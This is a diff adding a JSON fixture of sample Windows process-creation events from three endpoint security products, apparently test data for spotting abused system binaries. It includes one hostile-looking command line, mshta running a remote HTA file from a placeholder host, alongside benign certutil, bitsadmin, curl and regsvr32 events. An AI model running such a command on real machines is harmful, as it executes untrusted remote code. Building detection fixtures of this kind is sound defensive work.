@@ -1,0 +1,88 @@
+[
+  {
+    "_source": "defender_hunting",
+    "category": "AdvancedHunting-DeviceProcessEvents",
+    "tenantId": "11111111-1111-1111-1111-111111111111",
+    "properties": {
+      "DeviceId": "5555555555555555555555555555555555555555",
+      "DeviceName": "laptop-14.example.com",
+      "ActionType": "ProcessCreated",
+      "FileName": "certutil.exe",
+      "FolderPath": "C:\\Windows\\System32\\certutil.exe",
+      "ProcessCommandLine": "certutil.exe -hashfile C:\\Users\\jdoe\\Downloads\\setup.exe SHA256",
+      "InitiatingProcessFileName": "powershell.exe",
+      "AccountName": "jdoe"
+    }
+  },
+  {
+    "_source": "defender_hunting",
+    "category": "AdvancedHunting-DeviceProcessEvents",
+    "tenantId": "11111111-1111-1111-1111-111111111111",
+    "properties": {
+      "DeviceId": "5555555555555555555555555555555555555555",
+      "DeviceName": "laptop-14.example.com",
+      "ActionType": "ProcessCreated",
+      "FileName": "bitsadmin.exe",
+      "FolderPath": "C:\\Windows\\System32\\bitsadmin.exe",
+      "ProcessCommandLine": "bitsadmin.exe /transfer kb https://download.windowsupdate.com/c/msdownload/update/kb.cab C:\\Temp\\kb.cab",
+      "InitiatingProcessFileName": "cmd.exe",
+      "AccountName": "it-admin"
+    }
+  },
+  {
+    "_source": "defender_hunting",
+    "category": "AdvancedHunting-DeviceProcessEvents",
+    "tenantId": "11111111-1111-1111-1111-111111111111",
+    "properties": {
+      "DeviceId": "5555555555555555555555555555555555555555",
+      "DeviceName": "laptop-14.example.com",
+      "ActionType": "ProcessCreated",
+      "FileName": "mshta.exe",
+      "FolderPath": "C:\\Windows\\System32\\mshta.exe",
+      "ProcessCommandLine": "mshta.exe https://cdn.example.net/verify.hta",
+      "InitiatingProcessFileName": "explorer.exe",
+      "AccountName": "jdoe"
+    }
+  },
+  {
+    "_source": "crowdstrike_fdr",
+    "event_simpleName": "ProcessRollup2",
+    "aid": "0123456789abcdef0123456789abcd51",
+    "cid": "fedcba9876543210fedcba9876543210",
+    "event_platform": "Win",
+    "ImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\curl.exe",
+    "CommandLine": "curl.exe -o C:\\Temp\\x.zip https://downloads.example.com/x.zip",
+    "ParentBaseFileName": "cmd.exe",
+    "RawProcessId": "7312",
+    "UserName": "jdoe"
+  },
+  {
+    "_source": "sentinelone_cloudfunnel",
+    "event": {
+      "category": "process",
+      "type": "Process Creation"
+    },
+    "agent": {
+      "uuid": "11112222333344445555666677770051"
+    },
+    "endpoint": {
+      "name": "laptop-15.example.com",
+      "os": "windows"
+    },
+    "tgt": {
+      "process": {
+        "name": "regsvr32.exe",
+        "cmdline": "regsvr32.exe /s C:\\Program Files\\Example\\plugin.dll",
+        "image": {
+          "path": "C:\\Windows\\System32\\regsvr32.exe"
+        },
+        "user": "EXAMPLE\\jdoe"
+      }
+    },
+    "src": {
+      "process": {
+        "name": "msiexec.exe"
+      }
+    }
+  }
+]
